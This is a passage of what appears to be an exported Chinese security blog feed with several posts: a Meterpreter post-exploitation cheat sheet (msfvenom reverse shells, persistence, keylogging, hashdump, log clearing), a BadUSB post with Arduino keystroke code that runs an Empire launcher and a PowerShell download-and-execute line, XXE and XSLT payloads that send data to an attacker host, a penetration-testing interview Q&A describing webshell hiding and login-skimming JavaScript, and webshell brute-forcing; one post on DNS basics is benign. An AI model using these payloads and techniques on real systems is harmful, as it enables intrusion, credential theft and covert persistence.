-f /etc/hosts 尝试利用filesnarf抓去往nfs共享目录中保存的文件 1root@67~# filesnarf -i eth0 尝试利用mailsnarf嗅探各类邮件数据，也可以正则匹配输出 1root@67~# mailsnarf -i eth0 攻击演示完了，我们也可以分别在攻击机和被攻击机上找到对方的ip地址： 被攻击的windows 7上： 那个10.211.55.7就是攻击机kali的ip地址 攻击机kali上： 可以看到10.211.55.4就是被攻击机windows 7的IP地址]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Meterpreter后渗透总结]]></title>
    <url>%2F2018%2F01%2F24%2FMeterpreter%E5%90%8E%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[好久没用metasploit了，系统整理下meterpreter的姿势，顺便复习一下 常用shellreverse_tcpLinux: 生成linux shell命令： 1msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=ip lport=4444 -felf -o LinuxShell 直接运行生成的shell木马会提示权限不够 所以需要给权限： 1root@67:~# chmod +x linuxshell 接着打开msf使用handler模块，设置payload 然后运行shell木马就能看到反弹的shell了，有时不会直接开启会话，需要输入会话编号手动进入 Windows: 1msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=端口 -f exe -o 文件名 剩下的就跟前面一样了 reverse_http基于http方式的反向连接，网速不好的时候不稳定 1msfvenom -p /windows/meterpreter/reverse_http lhost=ip lport=端口 f exe -o bind_tcp基于tcp的正向连接，内网渗透中常用 1msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o bindshell 注意，在payload中设置的rhost是目标机的ip，因为是我们主动去连接 常用命令基本命令： 1234background //让meterpreter在后台运行sessions -i x //进入会话，x表示第几个会话quit //退出会话shell //得到控制台权限 文件系统命令： 123456cat //查看文件内容getwd //查看当前工作目录upload //上传文件download//下载文件edit //编辑文件search //搜索文件 网络命令： 123portfwd add -l 4444 -p 3389 -r ip //端口转发，本机监听4444，把目标机3389端口转发到本机4444rdesktop -u administrator -p password 127.0.0.1:4444 //然后使用rdesktop连接，-u 用户名 -p 密码route //获取路由表信息 网络命令： 12345678ps //查看当前活跃进程migrade pid //将meterpreter会话移植到进程数位pid的进程中execute -H -i -f cmd.exe //创建新进程cmd.exe，-H不可见，-i交互getpid //获取当前进程的pidkill pid //杀死进程getuid //查看权限sysinfo //查看目标机系统信息shutdown //关机 后门前面的步骤只是注入了内存的shellcode，只要目标重启就失去了控制权，所以我们需要留一个后门（back♂door） 本来有一个enum_drives模块，可以查看目标的磁盘分区情况，但是测试发现好像不能用了 persistence后渗透模块先进入一个会话，在运行模块 1解释一下参数，-X是开机启动，-i是反向连接的时间间隔，-r是自己的ip 接着就是创建handler监听等待后门连接 metsvc后渗透模块连接会话后直接run 但是我的虚拟机不知道是不是配置问题，总是显示不能打开管理服务 getgui后渗透模块开启远程桌面服务 1run get -e 添加用户（复现的时候没成功） 1run getgui -u 用户名 -p 密码 其他后渗透模块提权（同样没成功） 1getsystem 键盘记录 123keyscan_startkeystart_dumpkeyscan_stop 系统账号密码获取（前提是要system权限） 1hashdump 获取目标的软件安装信息，并且会默认存储在本地 1run post/windows/gather/enum_applications 获取目标最近访问过的文档、链接信息 1run post/windows/gather/dumplinks 获取目标IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码 1run post/windows/gather/enum_ie 结尾1clearv 擦干净屁股 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>windows</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS的基础学习与理解]]></title>
    <url>%2F2018%2F01%2F22%2FDNS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[DNS协议是互联网使用最广泛的协议之一，其作用又解析域名，定位邮件服务器，找到域的域控制器 DNS解析过程：1.DNS服务器向根服务器发送一个查询请求 2.根服务器回应其相应委派的服务器域名和IP地址 3.DNS服务器向这个委派的服务器发起域名解析请求 4.回应下一层委派的服务器域名和IP地址 5.DNS服务器向负责区域的服务器发起查询请求 6.返回所查询域名的IP地址 DNS服务器：主服务器：一般的解析请求由主服务器负责， 辅助服务器：辅助服务器的数据是从主服务器复制过来的，其数据是只读的。辅助服务器本身是一种容错设计，当主服务器出现故障或者因负载过重无法响应客户机的解析请求时，辅助服务器会担负起解析域名的责任 新创建的辅助服务器可能会出现“不是由DNS服务器加载的区域”的错误，这是由于辅助服务器还没与主服务器同步，等几分钟刷新下就好 DNS区域：主服务器使用的区域时主要区域，辅助服务器使用的区域是辅助区域。区域内的所有记录都存储在区域数据文件中，一般命名为“域名.dns” 正向区域建立正向区域的过程中会选择是否允许动态更新。一般处在内网中的DNS区域会允许动态更新，处于internet就不需要动态更新。 正向区域创建完毕后只有一个NS记录和SOA记录 反向区域在创建反向主要区域的向导中，会要求输入当前网络号，网络号是IP地址和子网掩码进行与运算后的结果。反向区域的名称也不能随便设置，必须是颠倒的网络号加上in-addr.arpa后缀，例如192.168.2.1的反向区域名称为1.2.168.192.in-addr-arpa。 反向区域不需要动态更新 存根区域存根区域可以看做是一个特殊的，简化的辅助区域。辅助区域辅助区域里的所有记录，存根区域只复制区域的SOA记录、NS记录及A记录。存根区域只需要知道利用哪个DNS服务器可以对DNS记录进行解析就行，但是含有存根区域的服务器对该区域没有管理权 DNS记录：完全合格域名：完全合格玉米羹指的是以点结尾的域名，例如eagerseven.cn.。这个点代表了DNS的根，有了这个点，完全合格域名就可以表达为一个绝对路径，例如bbs.xxx.com.可以表示为DNS根下的com子域下xxx.com域中一个名为bbs的主机。如果DNS发现一个域名不是以点结尾的完全合格域名，就会把这个域名加上当前的域名名称作为后缀，让其满足完全合格域名的格式。例如DNS会把bbs处理为bbs.xxx.com.。因此这个点不能省略 A记录A记录也称主机记录，是使用最广泛的DNS记录，其基本作用就是说明一个域名对应的IP是多少。A记录还有一个高级用法，A记录由负载平衡的作用，当有四个web服务器共同负责一个网站时，创建四个主机记录分别描述对应的四个IP，当客户机访问DNS服务器时，四个服务器轮流进行解析，减轻了负载负担。 当实验验证时，两次ping此域名时，得到的是同一个IP地址，这是因为客户机有DNS缓存机制，使用ipconfig/flushdns命令即可。 NS记录NS记录也叫名称服务器记录，用于说明这个区域有哪些DNS服务器负责解析 NS记录依赖A记录的解析，因此NS记录创建之前应先创建A记录 SOA记录SOA记录也称为其实授权机构记录，SOA记录说明负责解析的DNS服务器中哪一个是主服务器，以及主服务器和辅助服务器之间的一些关联参数： 序列号：序列号反应了DNS服务器数据变化的次数，DNS服务器的数据每更新一次，序列号就自加一。这个参数对管理员意义不大，但是对辅助服务器意义重大，辅助服务器对序列号进行减产，如果主服务器的序列号比自己大，那么就该复制主服务器的数据了 主服务器：NS记录和SOA记录的主服务器值默认都不是一个可以解析的完全合格域名，主要是因为这是这台DNS服务器的netbios名称 负责人：负责人参数一般为“admin.域名”，其含义为admin@域名，是一个邮箱地址，不直接写成admin@域名的原因是@在DNS中代表当前区域。 刷新间隔：指辅助服务器每隔指定时间联系一下主服务器，查看主服务器有无数据更新 重试间隔：指如果辅助服务器与主服务器失去了联系，就每隔指定时间联系一下主服务器，在此期间由辅助服务器负责当前区域的域名解析。 过期时间：指如果辅助服务器过了指定时间还没联系上主服务器，那么辅助服务器就认为主服务器再也联系不上了，就会清除自己的数据，并拒绝为用户继续提供解析服务。 TTL：指记录在DNS缓存中的生存时间 MX记录MX记录也叫邮件交换记录，MX记录用于标示哪台服务器是当前区域的邮件服务器。如果一个区域有多个MX记录，而且优先级不同，那么其他邮件服务器给本服务器发邮件时，会先把邮件发给优先级高的邮件服务器，数字越低优先级越高，最高为0 MX记录工作流程：A邮件服务器给B邮件服务器发送一封电子邮件，A的STMP服务器先向DNS服务器发送一个查询请求，请DNS服务器查询B的MX记录，这个A的SMTP服务器就能定义B的SMTP服务器，然后就能发送邮件给B Cname记录Cname也叫别名记录，可以让一个服务器有多个域名。例如我们可以把服务器命名为mail.xxx.com，再创建一个Cname记录叫ftp.xxx.com。另一方面，当管理员不希望别人知道网站的真实域名时，可以用Cname记录创建网站别名 SRV记录SRV记录是服务器资源记录的缩写，SRV记录是后来才进行定义的，因此老版本的DNS服务器不支持SRV记录。其作用是说明这个服务器能提供什么样的服务。域内的计算机还依赖SRV记录来定位域控制器。 PTR记录PTR记录也被称为指针记录，是A记录的逆向记录，作用是将IP地址解析为域名。PTR记录必须在反向区域中创建。 DNS后台文件：Boot文件：位置在C:\Windows\System32\DNS目录下，但是去目录下并没有Boot文件，原因是DNS引导信息可以有三种保存途径： 1231.保存在Boot文件2.保存在注册表3.保存在Active Rirectory 系统为了防止用户误删Boot文件，默认以另外两种方式保存。修改DNS服务器引导信息的保存方式就能在目录看到文件 主服务器中的Boot文件中的Primay代表DNS服务器是主服务器，但不是根域的DNS服务器，cache.dns才能解析根域，cache.dns中记录了13个根服务器的域名和IP地址 辅助服务器中的Boot文件中的secondary表示是当前区域的辅助服务器，根域的解析也是依靠cache.dns中的13个根服务器 可以利用Boot文件控制DNS启动时加载的区域数据，也可以使辅助服务器变成主服务器 Cache.dns前面提到Cache.dns中记录了13个根服务器的完全合格域名和IP地址，@是个缩写，代表当前区域（根域）。每个服务器用两条记录描述，NS记录说明谁是根域的DNS服务器，A记录说明这台DNS服务器的IP地址 大型企业可能自己使用私有根做一个根服务器，这时需要修改Cache.dns 区域数据文件区域数据文件是DNS服务器的核心，保存了区域中的所有DNS记录 利用DNS区域数据文件完成两项常见任务：空域名解析和泛域名解析 空域名解析：就是解析xxx.com，如果想把空域名解析成192.168.2.1，那就在区域数据文件中写入 @ A 192.168.2.1，@代表当前区域，相当于xxx.com 泛域名解析：就是把所有以xxx.com结尾但又没出现在DNS区域中的域名进行解析，例如ww.xxx.com。想把泛域名解析成192.168.2.1，就在区域数据文件中写入 A 192.168.2.1，是通配符 区域数据文件还能完成一件伟大的任务——委派我们准备A.xxx.com的解析权委派给DNS服务器ns.A.xxx.com，这台服务器的IP是192.168.2.1，那么在区域数据文件中写入下列两条记录即可： 12A NS ns.A.xxx.com.ns.A A 192.168.2.1 路还很长]]></content>
      <tags>
        <tag>协议</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[badusb小玩具]]></title>
    <url>%2F2018%2F01%2F20%2Fbadusb%E5%B0%8F%E7%8E%A9%E5%85%B7%2F</url>
    <content type="text"><![CDATA[了解到badusb，觉得挺好玩的，就自己买了个橡皮鸭 事先准备1.橡皮鸭单机开发版（当然也可以用其他板子或者USB，当然了，不是所有USB都可以，当初在gayhub上看到过一个USB汇总，上面列举了各种可以用来制作badusb的型号）2.Arduino 测试过程1.进入Arduino，进入这个软件有点慢，稍等片刻即可 2.然后选择工具&gt;开发版:”Arduino Leonardo”&gt;Arduino Leonardo 3.将以下代码烧录进去（需要注意，尽量别在循环体里面写入代码，不然修改不方便）： 12345678910111213141516171819202122232425262728293031323334#include&lt;Keyboard.h&gt; //包含键盘模块头文件void setup(); //初始化Keyboard.begin();//开始键盘通信delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题Keyboard.release(KEY_CAPS_LOCK); //释放大写键delay(500);Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 delay(500); Keyboard.press(&apos;r&apos;);//按下r键 delay(500); Keyboard.release(KEY_LEFT_GUI);//松掉win键 Keyboard.release(&apos;r&apos;);//松掉r键 delay(500); Keyboard.println(&quot;cmd&quot;);//输入cmd进入DOSdelay(500); Keyboard.press(KEY_RETURN); //按下回车键Keyboard.release(KEY_RETURN); //释放回车键delay(500); Keyboard.println(&quot;echo first test&quot;);Keyboard.press(KEY_RETURN); //按下回车键Keyboard.release(KEY_RETURN); //释放回车键delay(500);Keyboard.press(KEY_CAPS_LOCK); //按下大写键Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键delay(500);Keyboard.end();//结束键盘通讯 &#125; void loop()//循环，这里的代码&#123; //循环体 写入你要循环的代码&#125; 不出意外的话会显示上传成功，并且会断开当前连接，然后进入虚拟机，就会发现自动执行了我们写入的程序 以下是自动关机的程序： 123456789101112131415161718192021222324252627282930#include &lt;Keyboard.h&gt;void setup() &#123;//初始化 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500); Keyboard.press(&apos;r&apos;);//r键 delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release(&apos;r&apos;); Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法 Keyboard.release(KEY_CAPS_LOCK); delay(500); Keyboard.println(&quot;CMD&quot;); delay(500); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000); Keyboard.println(&quot;shutdown -s -t 10&quot;); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end();//结束键盘通讯 &#125;void loop()//循环&#123; &#125; 更加猥琐的玩法通过以上测试我们发现可以让目标电脑执行任意命令，那是不是可以在目标主机下载或上传一些什么奇怪的东西啊嘿嘿嘿 下面演示结合empire去入侵一台计算机(搭建的docker)： 创建一个empire监听： 1234567891011(Empire)&gt; listeners[!] No listeners currently adtive(Empire:listeners)&gt; uselistener http //选择模块(Empire:listeners/http)&gt; info //相当于msf里的options....(Empire:listeners/http)&gt; set Name EagerSeven(Empire:listeners/http)&gt; set Host http://192.168.1.1:4444(Empire:listeners/http)&gt; set Port 4444(Empire:listeners/http)&gt; execute...(Empire:listeners/http)&gt; listeners /会看到这个监听的信息，包括name，module，host等 生成psl代码： 1(Empire:listeners)&gt; launcher powershell EagerSeven 复制生成的psl代码，生成的代码是base64加密的，需要解密一下，不然basusb内存可能不足 还有一点需要注意，必须把psl文件中的双引号改为单引号，否则再烧录时会报错。 写入烧录程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;Keyboard.h&gt;void setup()&#123; Keyboard.begin(); delay(1000); Keyboard.press(KEY_RIGHT_CTRL); Keyboard.press(KEY_RIGHT_SHIFT); delay(500); Keyboard.release(KEY_RIGHT_CTRL); Keyboard.release(KEY_RIGHT_SHIFT); delay(500); Keyboard.press(KEY_RIGHT_SHIFT); Keyboard.release(KEY_RIGHT_SHIFT); delay(500); Keyboard.press(KEY_LEFT_GUI); //按下win键 delay(500); Keyboard.press(&apos;r&apos;); delay(500); Keyboard.release(&apos;KEY_LEFT_GUI&apos;); Keyboard.release(&apos;r&apos;); delay(500); Keyboard.println(&quot;cmd&quot;); delay(500); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(500); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(500); Keyboard.println(&quot;powershell&quot;); Kerboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(1000); Keyboard.println(&quot;攻击代码&quot;); Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(500); Keyboard.press(KEY_RIGHT_SHIFT); Keyboard.release(KEY_RIGHT_SHIFT); delay(500); Keyboard.end();&#125;void loop()&#123; //循环体&#125; 在虚拟机中运行后，empire里有了一个会话。 12agents //就能看到那个会话interact 会话名 //进入会话 接下来就可以为所欲为了 远程执行还可以从自己服务器上下载木马或者其他东西 1powershell -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString(&apos;http://your.site/file.ps1&apos;); Bypass UAC这个思路是在freebuf上看到的 12345678910111213141516171819202122232425Keyboard.println(&quot;powershell -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString(&apos;http://your.site/file.ps1&apos;);&quot;);Keyboard.press(KEY_LEFT_CTRL);Keyboard.press(KEY_LEFT_SHIFT);Keyboard.press(KEY_RETURN);Keyboard.releaseAll();delay(500);Keyboard.press(KEY_RETURN);Keyboard.press(KEY_RETURN);Keyboard.releaseAll();delay(500);Keyboard.press(KEY_RETURN);Keyboard.press(KEY_RETURN);delay(500);Keyboard.press(KEY_RETURN);Keyboard.releaseAll();delay(2500);Keyboard.press(KEY_RETURN);Keyboard.releaseAll();Keyboard.press(KEY_LEFT_ALT);Keyboard.println(&apos;y&apos;); Keyboard.releaseAll();Keyboard.press(KEY_RETURN);Keyboard.releaseAll();delay(1500) 下面是gayhub上的一些利用方式及代码： https://github.com/Xyntax/BadUSB-code 路还很长]]></content>
      <tags>
        <tag>工具</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE的一点拓展]]></title>
    <url>%2F2018%2F01%2F14%2FXXE%E7%9A%84%E4%B8%80%E7%82%B9%E6%8B%93%E5%B1%95%2F</url>
    <content type="text"><![CDATA[前面学了下XXE漏洞，在fb上看到了其拓展攻击，并且XXE被列进了owasp top10，当然得好好学一下了 定义XML Schema:称为可拓展标记语言架构，用来定义xml文档的合法构建模块，类似dtd，schema是dtd的替代者 当有多个文档被一起使用的时候不同文档可能带来不同内容和定义名称相同的元素，这样就会发生命名冲突，xml解释器无法确定如何处理这类冲突，而xmlns可以解决，我们为标签添加了一个xmlns属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称，此时再把他们放在一起，xml解释器就不会报错了 123456&lt;abc:table xmlns:abc="url"&gt; &lt;!--这里xmlns:abc="url"表示这个table是用abc作为标记，table的写法在url中定义--&gt; &lt;abc:tr&gt; &lt;abc:td&gt;test1&lt;/abc:td&gt; &lt;abc:td&gt;test2&lt;/bac:td&gt; &lt;/abc:tr&gt;&lt;/abc:table&gt; xmlns=”namespaceURI” //表示默认的namespace，可以不使用前缀，非默认的便需要使用前缀避免xml报错 xmlns:namespace-prefix=”namespaceURI” //其中namespace-prefix为自定义自定义前缀，只要在这个xml文档中保证前缀不重复即可。namespaceURI是这个前缀对应的xml namespace的定义，如下例中的xmlns:xsi表示使用xsi作为前缀的namespace 12345678&lt;?xml version="1.0"?&gt;&lt;note xmlns="http://www.test1.com"xmlns:xsi="http://www.test2.com/xxx"xsi:schemaLocatin="http://www.test3.com/xxx http://www.test4.com/xxx"targetNamespace="http://www.test3.com/xxx"....&lt;/note&gt; xsi:schemaLocation属性就是namespace为http://www.test3.com/xxx里的schemaLocation属性。xsi:schemaLocation定义了XML Namespace和对应的XSD文档的位置关系。它的值由一个或多个uri引用对构成，两个uri之间以空格符分割。第一个uri是定义的XML namespace的值，第二个uri给出schema文档的位置，schema处理器将从这个位置读取schema文档，文档的targetNamespace必须与第一个uri相匹配 使用XML Schema实体的攻击方式XML Schema攻击的分类1.schemaLocation2.noNamespaceSchemaLoction3.Xlnclude4.XSLT攻击 schemaLoction12345678910&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE data[&lt;!ENTITY % remote SYSTEM"http://publicServer.com/external_entity_attribute.dtd"&gt;%remote;]&gt;&lt;ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ttt="http://test.com/attack" xsi:schemaLocation="ttt http://publicServer.com/&amp;internal;"&gt;4&lt;/ttt:datattt:data&gt; noNamespaceSchemaLoctionssrf实例： 123456789&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE data[&lt;!ENTITY % remote SYSTEM"http://publicServer.com/external_entity_attribute.dtd"&gt;%remote;]&gt;&lt;data xmlns:xsi="http:www.w3c.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://publicServer.com/&amp;internal;"&gt;&lt;/data&gt; XInclude不是所有的xml语法都支持XInclude,w3c在XInclude Implementations Report中列出了支持的列表，include的href属性中可以进行文件读取，也可以使用协议进行ssrf 12345678910&lt;?xml version='1.0' encoding="utf-8"?&gt;&lt;!DOCTYPE data[ &lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt; %remote;]&gt;&lt;data xmlns:xi="http://www.w3c.org/2001/SInclude"&gt; &lt;xi:include href="http://192.168.2.31/&amp;internal;" parse="text"&gt; &lt;/xi:include&gt;&lt;/data&gt; 以上实例中external_entity_arrtibute.dtd文件的内容，根据实例的参数实体payload的声明，在此处应该可以使用各种协议进行ssrf等操作 123&lt;!ENTITY % payload SYSTEM &quot;file:///sys/power/image_size&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &apos;%payload;&apos;&gt;&quot;&gt;%param1; XSLT攻击通过以下方式先用document()获得目标主机的信息，然后使用concat()将数据与evil主机进行拼接，然后document()访问拼接后的地址，便可以在evil主机日志上获得信息 123456&lt;xsl:variable name="payload"select="document('http://sensitive_host/',/)"/&gt;&lt;xsl:variable name="combine"select="concat('http://evilhost/',$payload)"/&gt;&lt;xsl:veriable name="result"select="document($combine)"/&gt; xsl中document()用于访问外部xml文档中的节点，concat(string, string….)用于返回字符串的拼接 路还很长，砥砺前行]]></content>
      <tags>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信安面试题]]></title>
    <url>%2F2018%2F01%2F14%2F%E4%BF%A1%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[偶然的机会看到了一些信安面试题，记录一下顺便系统的总结与拓展下自己的知识面 1.拿到一个待检测的站，你觉得应该先做什么？​ 收集信息，包括但不限于： 1whois， 网站源ip， 旁站， c段， 服务器系统版本， 容器版本， 程序版本， 数据库类型及版本， 二级域名， 防火墙 2.mysql的网站注入，5.0以上和5.0以下有什么区别？​ 5.0以下没有information_schema这个系统表，无法列表名，只能爆破 ​ 5.0以下是多用户单操作，5.0以上是多用户多操作 3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？​ 丢社工库里看看有没有泄漏密码，然后尝试用泄漏的密码来进行后台登录 ​ 用邮箱做关键词去搜索引擎搜索 ​ 利用搜索到的关联信息找出其他邮箱进而得到常用社交账号 ​ 社工找出社交账号，里面或许会找出管理员设置密码的习惯 ​ 利用已有信息生成专用字典 ​ 观察管理员常逛哪些非大众型网站，拿下它你会得到更多好东西 4.判断出网站的cms对渗透有什么意思？​ 查找网上已曝光的程序漏洞 ​ 如果开源，还能下载相应的源码进行代码审计 5.一个成熟并且相对安全的cms，渗透是扫目录的意义？​ 敏感文件，二级目录扫描 ​ 站长的误操作比如：网站备份的压缩文件，说明.txt，二级目录可能存放着其他站点 6.常见的网站服务器容器​ iis，apache，nginx，lighttpd，tomcat 7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？​ root权限以及网站的绝对路径 8.目前已知哪些版本的容器有解析漏洞，具体举例​ iis 6.0 ​ /xx.asp/xx.jpg “xx.asp”是文件夹名 ​ iis 7.0/7.5 ​ 默认fast-cgi开启，直接在url中图片地址后输入/1.php，会把图片当作php解析 ​ nginx ​ 版本小于等于0.8.37，利用方法和iis 7.0/7.5一样，fast-cgi关闭情况下也可利用 ​ 空字节代码（00截断）：xxx.jpg%00.php ​ apache ​ 上传的文件命名为：test.php.x1，apache是从右往左进行判断后缀 ​ lighttpd ​ xx.jpg/xx.php 9.如何手工快速判断目标站是windows还是linux服务器？​ url大小写判断 10.为何一个mysql数据库的站，只有一个80端口开放？​ 更改的端口，没有扫描出来 ​ 站库分离 ​ 3306端口不对外开放 11.3389无法连接的几种情况​ 没开放3389端口 ​ 端口被修改 ​ 防护拦截 ​ 处于内网（需要进行端口转发） 12.如何突破注入时字符被转义？​ 宽字节注入 ​ hex编码绕过 13.在某后台新闻编辑界面看到编辑器，应该先做什么？​ 查看编辑器的名称版本，然后搜索公开漏洞 14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？​ 能做的事情很多，用隐藏网马来举例子： ​ 插入 1&lt;FilesMatch &quot;xxx.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; .jpg文件会被解析成.php文件 15.注入漏洞只能查账户密码？​ 只要权限广，脱裤脱到老 16.安全狗会追踪变量，从而发现出是一句话木马么？​ 是根据特征码，所以很好绕过，所以思路宽，绕狗绕到欢，但这应该不会是一成不变的 17.access扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？​ 迅雷下载，直接改后缀为.mdb 18.提权时选择可读写目录，为何尽量不用带空格的目录？​ 因为exp执行多半需要空格界定参数 19.某服务器有站点a,b，为何在a的后台添加test用户，访问b的后台，发现也添加上了test用户​ 同数据库 20.注入时可以不使用and或or或xor，直接order by开始注入么​ and/or/xor，前面的1=1，1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省去 21.某个防注入系统，在注入时会提示：12345系统记录到你有非法注入的行为已记录您的ip：xxx.xxx.xxx.xxx时间：xxxx.xx.xx提交页面：xxx.php?id=1提交内容：and 1=1 如何利用这个防注入系统get shell？​ 在url里面直接提交一句话，这样网站把你的一句户记录进数据库文件，这个时候可以尝试寻找网站的配置文件，直接上菜刀连接 22.上传大马后访问乱码时，有哪些解决方法？​ 浏览器中改编码 ####23.审查上传点的元素有什么意义？ ​ 有些网站的上传文件类型的限制在前端实现的 24.目标站禁止注册用户，找回密码出随便输入用户名提示：“此用户不存在”，你觉得这里怎么样利用？​ 先爆破用户名，再利用爆破出的用户名爆破密码 ​ 其实有些登陆处也会这样提示 ​ 所有和数据库有交互的地方都可能存在注入 25.目标站发现某txt的下载地址为：http://www.test.down/down.php?file=/upwdown/w.txt。你有什么思路？​ 这就是传说中的下载漏洞，在file=后面尝试输入index.php下载它的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址 26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录，你有什么想法？​ 直接在网站二级目录/abc/下扫描敏感文件及目录 27.在有shell的情况下，如何使用xss实现对目标站的长久控制？​ 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功就把账号密码记录到一个生僻的路径的文件中，或者直接发到自己的网站文件中（此方法适合有价值并且需要深入控制权限的网络） ​ 在登录后才可以访问的文件中插入xss脚本 28.后台修改管理员密码出，原密码显示为*。你觉得该怎么样实现读出这个用户的密码？​ 审查元素，把密码出的password属性改为txt就明文显示了 29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因？​ 原因很多，有可能web服务器配置把上传的目录写死了不执行相应脚本，尝试改后缀名绕过 30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？​ 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，f12看html体部，比如护卫神就可以在名称那看到内容 31.在win2003服务器中建立一个.zhongzi文件夹用意是什么？​ 隐藏文件夹，为了不让管理员发现你上传的工具 路还很长，砥砺前行]]></content>
      <tags>
        <tag>学习体会</tag>
        <tag>知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf爆破一句话木马]]></title>
    <url>%2F2018%2F01%2F14%2Fmsf%E7%88%86%E7%A0%B4%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[偶然在某信息安全公众号上看到了一个关于msf爆破一句话木马密码的文章，觉得很有意思，自己复现来玩玩 首先在自己服务器上写入一个一句话木马1.php 123&lt;?php@eval('$_POST['cmd']');?&gt; 然后打开msf search caidao，发现有两个可用模块（截止2018/1/6） 然后msf一条龙： 123456use auxiliary/scanner/http/caidao_bruteforce_loginshow optionsset RHOST 目标ipset TARGETURI /木马名set PASS_FILE /自己的密码 //因为自带的字典不太符合国情，所以用大佬提供的字典破解国内密码更好run 过会可以看到已经爆破成功，连接菜刀即可 值得注意的是，我的实验环境搭在ali云服务器上，爆破的时候尝试几次就被ban ip了，所以有时爆破不成功不是msf的锅 路还很长]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞学习与测试]]></title>
    <url>%2F2017%2F12%2F07%2FXXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[最近临近期末考试，但是！考试就不搞技术了！？naive 概念基础：XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素 12345678910111213141516&lt;?xml version="1.0" ?&gt; &lt;!--XML声明--&gt;&lt;?DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PADATA)&gt; &lt;!ELEMENT heading (#PADATA)&gt; &lt;!ELEMENT body (#PADATA)&gt;]&gt; &lt;!--文档类型定义--&gt;&lt;note&gt;&lt;to&gt;George&lt;/go&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Do not forget the meeting!&lt;/body&gt;&lt;/note&gt; &lt;!--文档元素--&gt; DTD的作用是定义XML文档的合法构建模块。DTD可以在XML文档内声明，也可以外部引用 内部声明DTD： 1&lt;!DOCTYPE 根元素[元素声明]&gt; 引用外部DTD： 1&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt; or 1&lt;!DOCTYPE 根元素 PUBLIC "public_ID" "文件名"&gt; DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用 内部声明实体： 1&lt;!DOCTYPE 实体名称 "实体值"&gt; 引用外部实体： 1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; or 1&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 